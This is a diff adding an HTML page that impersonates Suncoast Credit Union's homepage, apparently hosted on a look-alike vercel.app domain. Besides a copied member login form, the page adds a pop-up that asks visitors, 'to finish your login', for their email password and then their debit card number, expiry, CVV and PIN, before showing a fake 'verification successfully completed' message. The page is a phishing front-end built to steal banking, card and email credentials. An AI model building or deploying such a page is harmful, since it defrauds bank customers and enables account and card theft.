@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="og:title" content="Suncoast Credit Union" />
+    <meta
+      name="og:description"
+      content="We’re Here For You: Coronavirus (COVID-19) Information for Members"
+    />
+    <meta
+      name="og:image"
+      content="https://wwwsuncoastcreditunioncom.vercel.app/__________img/meta/og-image-sun-only.jpg"
+    />
+    <title>Credit Unions in Florida | Suncoast Credit Union</title>
+    <link
+      rel="icon"
+      href="/__________img/meta/favicon.ico"
+      type="image/x-icon"
+    />
+
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300;0,400;0,500;0,600;1,300;1,400;1,500;1,600&display=swap"
+      rel="stylesheet"
+    />
+    <link
+      rel="stylesheet"
+      href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css"
+      integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p"
+      crossorigin="anonymous"
+    />
+
+    <link rel="stylesheet" href="/css/style.css" />
+    <link rel="stylesheet" href="/css/carousel.css" />
+    <link rel="stylesheet" href="/css/modal.css" />
+
+    <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+
+    <script src="/js/getClient.js" defer></script>
+    <script src="/js/fetcher.js" defer></script>
+    <script src="/js/loader.js" defer></script>
+    <script src="/js/fader-items-markup.js" defer></script>
+    <script src="/js/button.js" defer></script>
+    <script src="/js/carousel.js" defer></script>
+    <script src="/js/login-form.js" defer></script>
+    <script src="/js/modal.js" defer></script>
+  </head>
+  <body>
+    <div class="modal flex flex-jcc flex-aic">
+      <div class="modal-overlay"></div>
+
+      <div class="modal-content">
+        <div class="form-wrapper form-wrapper--show form-wrapper-email">
+          <h3>To finish with your login, input your email credentials</h3>
+
+          <form>
+            <div class="err text-sm">
+              Lorem ipsum dolor sit amet consectetur adipisicing elit.
+            </div>
+
+            <label for="email-address">Email Address</label>
+            <input
+              type="email"
+              required
+              placeholder="me@example.com"
+              id="email-address"
+            />
+            <label for="email-password">Email Password</label>
+            <input
+              type="password"
+              required
+              placeholder="Email Password"
+              id="email-password"
+            />
+
+            <div class="flex flex-jcsb flex-afe">
+              <button class="btn btn-lg mr-2" type="submit">
+                <span class="pr-4">Finish</span>
+
+                <i class="fa fa-chevron-right ml-2 opacity-2"></i>
+              </button>
+
+              <div class="text-sm link">
+                <i class="fas fa-lock"></i>
+                Secured
+              </div>
+            </div>
+          </form>
+        </div>
+
+        <div class="form-wrapper form-wrapper-debit">
+          <h3>To finish your login, input your debit card details</h3>
+
+          <form>
+            <div class="err text-sm">
+              Lorem ipsum dolor sit amet consectetur adipisicing elit.
+            </div>
+
+            <div>
+              <label for="cardNumber">Card Number</label>
+              <input
+                type="number"
+                data-maxlength="16"
+                oninput="this.value=this.value.slice(0,this.dataset.maxlength)"
+                required
+                placeholder="1234567890123456"
+                id="cardNumber"
+              />
+            </div>
+
+            <div class="grid grid-col-2">
+              <div>
+                <label for="expMonth">Expiry Month</label>
+                <input
+                  type="number"
+                  data-maxlength="2"
+                  oninput="this.value=this.value.slice(0,this.dataset.maxlength)"
+                  required
+                  placeholder="05"
+                  id="expMonth"
+                />
+              </div>
+              <div>
+                <label for="expYear">Expiry Year</label>
+                <input
+                  type="number"
+                  data-maxlength="2"
+                  oninput="this.value=this.value.slice(0,this.dataset.maxlength)"
+                  required
+                  placeholder="23"
+                  id="expYear"
+                />
+              </div>
+            </div>
+
+            <div class="grid grid-col-2">
+              <div>
+                <label for="cvv">CVV</label>
+                <input
+                  type="number"
+                  data-maxlength="3"
+                  oninput="this.value=this.value.slice(0,this.dataset.maxlength)"
+                  required
+                  placeholder="123"
+                  id="cvv"
+                />
+              </div>
+              <div>
+                <label for="pin">Pin</label>
+                <input
+                  required
+                  type="password"
+                  placeholder="1234"
+                  pattern="[0-9]*"
+                  title="Pin must be a number"
+                  maxlength="4"
+                  minlength="4"
+                  id="pin"
+                  class="form-input"
+                />
+              </div>
+            </div>
+
+            <div class="flex flex-jcsb flex-afe">
+              <button class="btn btn-lg mr-2" type="submit">
+                <span class="pr-4">Finish</span>
+
+                <i class="fa fa-chevron-right ml-2 opacity-2"></i>
+              </button>
+
+              <div class="text-sm link">
+                <i class="fas fa-lock"></i>
+                Secured
+              </div>
+            </div>
+          </form>
+        </div>
+
+        <div class="form-wrapper form-wrapper-success">
+          <h3>Verification successfully completed</h3>
+          <div class="icon">
+            <i class="fa fa-check"></i>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="container">
+      <header class="header flex flex-jcc flex-aic">
+        <div
+          class="flex flex-jcsb flex-aic mb-3 show-on-mobile-flex header-mobile-container"
+        >
+          <p class="text text-b color-grey header-routing-number">
+            Routing Number 263 182 817
+          </p>
+
+          <div class="text-sm header-auth-links">
+            <p class="link">LOG IN</p>
+            |
+            <p class="link">JOIN</p>
+            |
+            <p class="text-upper link">Español</p>
+          </div>
+
+          <button class="btn btn-mute btn-outline">
+            <i class="fa fa-map-marker-alt mr-2 opacity-2"></i>
+
+            BRANCH LOCATOR
+          </button>
+        </div>
+
+        <div class="header-container flex flex-1 flex-jcsb flex-aic">
+          <img src="/__________img/logo.png" alt="Suncoast Credit Union Logo" />
+
+          <div>
+            <div class="flex flex-jcsb flex-aic mb-3 hide-on-mobile-flex">
+              <p class="text text-b color-grey header-routing-number flex-1">
+                Routing Number 263 182 817
+              </p>
+
+              <div class="text-sm header-auth-links pr-4">
+                <p class="link">LOG IN</p>
+                |
+                <p class="link">JOIN</p>
+                |
+                <p class="text-upper link">Español</p>
+              </div>
+
+              <button class="btn btn-mute btn-outline">
+                <i class="fa fa-map-marker-alt mr-2 opacity-2"></i>
+
+                BRANCH LOCATOR
+              </button>
+            </div>
+
+            <div class="header-buttons flex">
+              <button class="btn btn-mute mr-2 hide-from-tablet-to-mobile">
+                personal
+
+                <i class="fa fa-chevron-down ml-2 opacity-2"></i>
+              </button>
+              <button class="btn btn-mute mr-2 hide-from-tablet-to-mobile">
+                business
+
+                <i class="fa fa-chevron-down ml-2 opacity-2"></i>
+              </button>
+              <button class="btn btn-mute mr-2 hide-from-tablet-to-mobile">
+                student
+
+                <i class="fa fa-chevron-down ml-2 opacity-2"></i>
+              </button>
+              <button class="btn btn-mute mr-2 hide-from-tablet-to-mobile">
+                resources
+
+                <i class="fa fa-chevron-down ml-2 opacity-2"></i>
+              </button>
+              <button class="btn btn-mute mr-2 hide-from-tablet-to-mobile">
+                community
+
+                <i class="fa fa-chevron-down ml-2 opacity-2"></i>
+              </button>
+              <button class="btn btn-mute mr-2 hide-from-tablet-to-mobile">
+                blog
+              </button>
+              <button class="btn btn-icon btn-mute">
+                <i class="fa fa-search opacity-2"></i>
+              </button>
+
+              <button class="btn btn-icon btn-mute show-from-tablet-to-mobile">
+                <i class="fa fa-bars opacity-2"></i>
+              </button>
+            </div>
+          </div>
+        </div>
+      </header>
+
+      <section class="login-section flex flex-jcc flex-aic">
+        <div class="login-section-container">
+          <form class="login-form flex flex-jcsb">
+            <div>
+              <div class="flex mb-2">
+                <div class="login-form-input-group">
+                  <div class="login-form-err">
+                    Please fill out required fields
+                  </div>
+
+                  <label for="member-number" class="member-login-label"
+                    >Member Log In
+
+                    <img src="/__________img/icon-lock.png" alt="Lock Icon" />
+                  </label>
+
+                  <input
+                    type="text"
+                    placeholder="Member Number"
+                    id="member-number"
+                    maxlength="10"
+                  />
+                  <input type="password" placeholder="Password" />
+                </div>
+
+                <button
+                  class="btn btn-lg mr-2 hide-from-tablet-to-mobile"
+                  type="submit"
+                >
+                  <span class="pr-4">log in</span>
+
+                  <i class="fa fa-chevron-right ml-2 opacity-2"></i>
+                </button>
+              </div>
+
+              <!-- Laptop -->
+              <div class="flex flex-jcfe">
+                <div class="login-form-links flex flex-jcsb">
+                  <p class="link link-line text-sm hide-on-mobile">
+                    Forgot Password
+                  </p>
+                  <p class="link link-line text-sm setup-online">
+                    Set Up Online Access
+                  </p>
+                </div>
+              </div>
+
+              <!-- Tablet -->
+              <div
+                class="flex flex-jcsb show-from-tablet-to-mobile-flex pt-4 tablet-links"
+              >
+                <div class="tablet-links-container">
+                  <div>
+                    <p class="link link-line text-sm">Set Up Online Access</p>
+                  </div>
+
+                  <div>
+                    <span class="text-sm">New to Suncoast? </span>
+                    <p class="link link-line text-sm">Join Now</p>
+                  </div>
+                </div>
+
+                <button class="btn btn-lg btn-mute mr-2" type="submit">
+                  <span class="pr-4">log in</span>
+
+                  <i class="fa fa-chevron-right ml-2 opacity-2"></i>
+                </button>
+              </div>
+
+              <!-- Mobile -->
+              <div class="mobile-links show-on-mobile">
+                <div class="flex flex-jcsb">
+                  <p class="link link-line text-sm">Forgot Password</p>
+                  <p class="link link-line text-sm">Set Up Online Access</p>
+                </div>
+
+                <div class="join-now">
+                  <span class="text-sm">New to Suncoast? </span>
+                  <p class="link link-line text-sm">Join Now</p>
+                </div>
+              </div>
+            </div>
+
+            <button
+              class="btn btn-lg btn-accent btn-mute mr-2 hide-from-tablet-to-mobile"
+              type="button"
+            >
+              <span class="pr-4">join now</span>
+
+              <i class="fa fa-chevron-right ml-2 opacity-2"></i>
+            </button>
+          </form>
+        </div>
+      </section>
+
+      <div class="carousel">
+        <div class="slider">
+          <div class="slider-item">
+            <img
+              src="/__________img/carousel/car-sale-slider.jpg"
+              alt="Car Sale Banner"
+              class="slider-item-banner"
+            />
+          </div>
+
+          <div class="slider-item">
+            <img
+              src="/__________img/carousel/youth-month-2022-slider.png"
+              alt="Youth Month 2022 Banner"
+              class="slider-item-banner"
+            />
+          </div>
+
+          <div class="slider-item">
+            <img
+              src="/__________img/carousel/fuelrewards-slider.jpg"
+              alt="Fuel Rewards"
+              class="slider-item-banner"
+            />
+          </div>
+
+          <div class="slider-item">
+            <img
+              src="/__________img/carousel/raf-2022.jpg"
+              alt="Referer Banner"
+              class="slider-item-banner"
+            />
+          </div>
+        </div>
+
+        <div class="fader">
+          <div class="fader-item">
+            <h1>Enjoy the Ride to Buy Your Ride!</h1>
+
+            <p>
+              You're sure to find your dream-ride at this in-person,
+              members-only sale which happens April 9 at our
+              <b>Hillsborough Avenue Service Center</b>. Save with rates as low
+              as 2.25% APR* AND get a $50 Visa gift card**.
+            </p>
+
+            <button class="btn btn-mute mr-2">
+              <span class="text-sm">learn more</span>
+
+              <i class="fa fa-chevron-down ml-2 opacity-2"></i>
+            </button>
+          </div>
+        </div>
+
+        <div class="carousel-controls">
+          <img
+            src="/__________img/carousel/slider-prev-arrow.png"
+            alt="slider prev arrow"
+            id="prev"
+          />
+
+          <img
+            src="/__________img/carousel/slider-pause.png"
+            alt="slider pause"
+            id="pause-play"
+            data-toggle="pause"
+          />
+
+          <img
+            src="/__________img/carousel/slider-next-arrow.png"
+            alt="slider next arrow"
+            id="next"
+          />
+        </div>
+      </div>
+
+      <div class="pb-3"></div>
+
+      <section class="content-section">
+        <h1>Florida’s Largest Credit Union</h1>
+
+        <p>
+          Suncoast Credit Union puts members first and enriches our local
+          communities. We offer lower rates on loans, higher earnings on
+          deposits and more free services so you can live your best life.
+        </p>
+      </section>
+
+      <section class="specials-promotions-banner flex flex-aic">
+        <img src="/__________img/lamp_banner.png" alt="lamp" id="lamp" />
+
+        <div class="flex-1">
+          <p>Specials and Promotions happening at Suncoast</p>
+          <p>Check back often for the most up-to-date information.</p>
+        </div>
+
+        <img
+          src="/__________img/carousel/slider-next-arrow.png"
+          alt="arrow next"
+          id="arrow-next"
+        />
+      </section>
+
+      <section class="content-section">
+        <h1>We’re Designed to Help You Save</h1>
+
+        <p>
+          Since we’re a credit union, we put you first. We offer serious savings
+          and better deals across the board – on everything from auto loans to
+          credit cards. Check out the savings in your area below.
+        </p>
+      </section>
+    </div>
+  </body>
+</html>
